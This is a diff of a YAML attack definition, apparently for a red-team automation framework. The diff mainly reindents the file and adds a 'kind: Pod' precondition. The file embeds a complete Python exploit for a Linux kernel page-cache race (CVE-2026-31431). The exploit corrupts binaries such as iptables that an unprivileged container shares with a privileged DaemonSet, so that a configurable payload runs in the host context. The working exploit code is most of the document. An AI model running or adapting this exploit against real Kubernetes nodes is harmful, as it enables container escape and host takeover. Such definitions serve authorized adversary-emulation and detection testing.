@@ -1,144 +1,145 @@
 name: Escape container via CopyFail (CVE-2026-31431)
 description: >
-  Exploit a Linux kernel page-cache Copy-on-Write race (CVE-2026-31431) to escape an
-  unprivileged container. An AF_ALG AEAD splice race overwrites the in-memory cached
-  pages of a binary shared between the attacker container and a privileged DaemonSet
-  (e.g. kube-proxy, node-exporter). When the DaemonSet next executes the corrupted
-  binary, the attacker payload runs with the DaemonSet's full privileges and host
-  namespace access. No special capabilities, no root, and no host mounts required in
-  the attacker pod. Vulnerable kernels: < 6.6.89, < 6.12.80.
-  See examples/Simple_Env/2_worker.yaml for a canonical victim pod manifest.
+    Exploit a Linux kernel page-cache Copy-on-Write race (CVE-2026-31431) to escape an
+    unprivileged container. An AF_ALG AEAD splice race overwrites the in-memory cached
+    pages of a binary shared between the attacker container and a privileged DaemonSet
+    (e.g. kube-proxy, node-exporter). When the DaemonSet next executes the corrupted
+    binary, the attacker payload runs with the DaemonSet's full privileges and host
+    namespace access. No special capabilities, no root, and no host mounts required in
+    the attacker pod. Vulnerable kernels: < 6.6.89, < 6.12.80.
+    See examples/Simple_Env/2_worker.yaml for a canonical victim pod manifest.
 tactic: "Privilege Escalation"
 techniques: ["Escape to Host", "T1611"]
-status: draft  # draft does not block execution; operator must ensure the node kernel is vulnerable
+status: draft # draft does not block execution; operator must ensure the node kernel is vulnerable
 effects:
-  - container.escape(sys)
+    - container.escape(sys)
 parameters:
-  KERNEL_VERSION:
-    type: string
-    required: false
-    description: >
-      Kernel version of the target node. Cosmetic today; documents the vulnerable
-      range (<6.6.89 or <6.12.80) and will gate the TTP once the framework gains
-      kernel-version awareness.
-  PAYLOAD:
-    type: string
-    required: false
-    default: hostname
-    description: >
-      Command to execute in the host context once a privileged binary is corrupted
-      and triggered by the DaemonSet.
+    KERNEL_VERSION:
+        type: string
+        required: false
+        description: >
+            Kernel version of the target node. Cosmetic today; documents the vulnerable
+            range (<6.6.89 or <6.12.80) and will gate the TTP once the framework gains
+            kernel-version awareness.
+    PAYLOAD:
+        type: string
+        required: false
+        default: hostname
+        description: >
+            Command to execute in the host context once a privileged binary is corrupted
+            and triggered by the DaemonSet.
 preconditions:
-  accessLevel: "user-exec"
-  # kernel: "<6.6.89 || <6.12.80"  -- enforced once framework gains kernel-version awareness
+    accessLevel: "user-exec"
+    kind: Pod
+    # kernel: "<6.6.89 || <6.12.80"  -- enforced once framework gains kernel-version awareness
 procedures:
-  - key: copyfail-poc
-    command: python3
-    isLocal: true
-    # execute: handled by Go runtime only; Rust parser ignores this field
-    execute:
-      lang: python
-      code: |-
-        import ctypes
-        import ctypes.util
-        import os
-        import socket
-        import struct
-        import sys
+    - key: copyfail-poc
+      command: python3
+      isLocal: true
+      # execute: handled by Go runtime only; Rust parser ignores this field
+      execute:
+          lang: python
+          code: |-
+              import ctypes
+              import ctypes.util
+              import os
+              import socket
+              import struct
+              import sys
 
-        LIBC = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
-        AF_ALG      = 38
-        SOL_ALG     = 279
-        ALG_SET_KEY = 1
-        NR_SPLICE   = 275  # x86_64; adjust for arm64: 76
+              LIBC = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+              AF_ALG      = 38
+              SOL_ALG     = 279
+              ALG_SET_KEY = 1
+              NR_SPLICE   = 275  # x86_64; adjust for arm64: 76
 
-        # Binaries commonly present in both a minimal attacker image and
-        # privileged DaemonSets built on the same base layer.
-        TARGETS = [
-            "/usr/sbin/xtables-legacy-multi",
-            "/usr/sbin/nft",
-            "/usr/sbin/ipset",
-            "/sbin/iptables",
-        ]
+              # Binaries commonly present in both a minimal attacker image and
+              # privileged DaemonSets built on the same base layer.
+              TARGETS = [
+                  "/usr/sbin/xtables-legacy-multi",
+                  "/usr/sbin/nft",
+                  "/usr/sbin/ipset",
+                  "/sbin/iptables",
+              ]
 
-        def find_target():
-            for path in TARGETS:
-                if os.path.isfile(path):
-                    return path
-            return None
+              def find_target():
+                  for path in TARGETS:
+                      if os.path.isfile(path):
+                          return path
+                  return None
 
-        def _splice(fd_in, fd_out, length):
-            ret = LIBC.syscall(NR_SPLICE, fd_in, None, fd_out, None, length, 0)
-            if ret < 0:
-                raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
-            return ret
+              def _splice(fd_in, fd_out, length):
+                  ret = LIBC.syscall(NR_SPLICE, fd_in, None, fd_out, None, length, 0)
+                  if ret < 0:
+                      raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+                  return ret
 
-        def setup_alg_aead(key: bytes) -> int:
-            # struct sockaddr_alg: family(2) + type(14) + feat(4) + mask(4) + name(64)
-            sa = struct.pack("=H14sII64s", AF_ALG, b"aead", 0, 0, b"gcm(aes)")
-            sa_buf = ctypes.create_string_buffer(sa)
-            alg_fd = LIBC.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
-            if alg_fd < 0:
-                raise OSError(ctypes.get_errno(), "socket(AF_ALG) failed")
-            if LIBC.bind(alg_fd, sa_buf, len(sa)) < 0:
-                raise OSError(ctypes.get_errno(), "bind(AF_ALG) failed")
-            key_buf = ctypes.create_string_buffer(key)
-            if LIBC.setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key_buf, len(key)) < 0:
-                raise OSError(ctypes.get_errno(), "setsockopt(ALG_SET_KEY) failed")
-            op_fd = LIBC.accept(alg_fd, None, None)
-            if op_fd < 0:
-                raise OSError(ctypes.get_errno(), "accept(AF_ALG) failed")
-            return op_fd
+              def setup_alg_aead(key: bytes) -> int:
+                  # struct sockaddr_alg: family(2) + type(14) + feat(4) + mask(4) + name(64)
+                  sa = struct.pack("=H14sII64s", AF_ALG, b"aead", 0, 0, b"gcm(aes)")
+                  sa_buf = ctypes.create_string_buffer(sa)
+                  alg_fd = LIBC.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+                  if alg_fd < 0:
+                      raise OSError(ctypes.get_errno(), "socket(AF_ALG) failed")
+                  if LIBC.bind(alg_fd, sa_buf, len(sa)) < 0:
+                      raise OSError(ctypes.get_errno(), "bind(AF_ALG) failed")
+                  key_buf = ctypes.create_string_buffer(key)
+                  if LIBC.setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key_buf, len(key)) < 0:
+                      raise OSError(ctypes.get_errno(), "setsockopt(ALG_SET_KEY) failed")
+                  op_fd = LIBC.accept(alg_fd, None, None)
+                  if op_fd < 0:
+                      raise OSError(ctypes.get_errno(), "accept(AF_ALG) failed")
+                  return op_fd
 
-        def corrupt(target_path: str, payload_cmd: str, max_rounds: int = 10_000) -> bool:
-            pipe_r, pipe_w = os.pipe()
-            target_fd = os.open(target_path, os.O_RDONLY)
-            op_fd = setup_alg_aead(b"\x00" * 16)
-            payload = (payload_cmd + "\n").encode().ljust(16, b"\x00")
-            needle = payload.rstrip(b"\x00")[:4]
-            print(f"[*] CopyFail target: {target_path}")
-            print(f"[*] Starting AF_ALG splice race ({max_rounds} rounds max)")
-            try:
-                for i in range(max_rounds):
-                    os.lseek(target_fd, 0, os.SEEK_SET)
-                    _splice(target_fd, pipe_w, 4096)
-                    try:
-                        os.write(op_fd, payload)
-                    except OSError:
-                        pass
-                    try:
-                        os.read(pipe_r, 4096)
-                    except OSError:
-                        pass
-                    with open(target_path, "rb") as f:
-                        head = f.read(len(payload))
-                    if needle in head:
-                        print(f"[+] Page-cache corruption confirmed after {i + 1} rounds")
-                        print(f"[+] '{payload_cmd}' runs next time a privileged process calls {target_path}")
-                        return True
-                    if i % 1000 == 0 and i > 0:
-                        print(f"[*] Round {i}…")
-                print("[-] Race not won within max rounds — kernel may be patched")
-                return False
-            finally:
-                os.close(target_fd)
-                os.close(op_fd)
-                os.close(pipe_r)
-                os.close(pipe_w)
+              def corrupt(target_path: str, payload_cmd: str, max_rounds: int = 10_000) -> bool:
+                  pipe_r, pipe_w = os.pipe()
+                  target_fd = os.open(target_path, os.O_RDONLY)
+                  op_fd = setup_alg_aead(b"\x00" * 16)
+                  payload = (payload_cmd + "\n").encode().ljust(16, b"\x00")
+                  needle = payload.rstrip(b"\x00")[:4]
+                  print(f"[*] CopyFail target: {target_path}")
+                  print(f"[*] Starting AF_ALG splice race ({max_rounds} rounds max)")
+                  try:
+                      for i in range(max_rounds):
+                          os.lseek(target_fd, 0, os.SEEK_SET)
+                          _splice(target_fd, pipe_w, 4096)
+                          try:
+                              os.write(op_fd, payload)
+                          except OSError:
+                              pass
+                          try:
+                              os.read(pipe_r, 4096)
+                          except OSError:
+                              pass
+                          with open(target_path, "rb") as f:
+                              head = f.read(len(payload))
+                          if needle in head:
+                              print(f"[+] Page-cache corruption confirmed after {i + 1} rounds")
+                              print(f"[+] '{payload_cmd}' runs next time a privileged process calls {target_path}")
+                              return True
+                          if i % 1000 == 0 and i > 0:
+                              print(f"[*] Round {i}…")
+                      print("[-] Race not won within max rounds — kernel may be patched")
+                      return False
+                  finally:
+                      os.close(target_fd)
+                      os.close(op_fd)
+                      os.close(pipe_r)
+                      os.close(pipe_w)
 
-        payload_cmd = "${PAYLOAD}"
-        kernel = "${KERNEL_VERSION}" if "${KERNEL_VERSION}" else "unknown"
-        print(f"[*] CopyFail CVE-2026-31431 — node kernel: {kernel}")
-        target = find_target()
-        if not target:
-            print("[-] No suitable target binary found in shared image layers")
-            sys.exit(1)
-        corrupt(target, payload_cmd)
+              payload_cmd = "${PAYLOAD}"
+              kernel = "${KERNEL_VERSION}" if "${KERNEL_VERSION}" else "unknown"
+              print(f"[*] CopyFail CVE-2026-31431 — node kernel: {kernel}")
+              target = find_target()
+              if not target:
+                  print("[-] No suitable target binary found in shared image layers")
+                  sys.exit(1)
+              corrupt(target, payload_cmd)
 
-  - key: ran-implant
-    command: ran-implant --exploit copyfail --payload ${PAYLOAD}
-    # TODO: ran-implant bundles this exploit among others; does not exist yet
+    - key: ran-implant
+      command: ran-implant --exploit copyfail --payload ${PAYLOAD}
+      # TODO: ran-implant bundles this exploit among others; does not exist yet
 
 references:
-  - https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
-  - https://attack.mitre.org/techniques/T1611/
+    - https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
+    - https://attack.mitre.org/techniques/T1611/
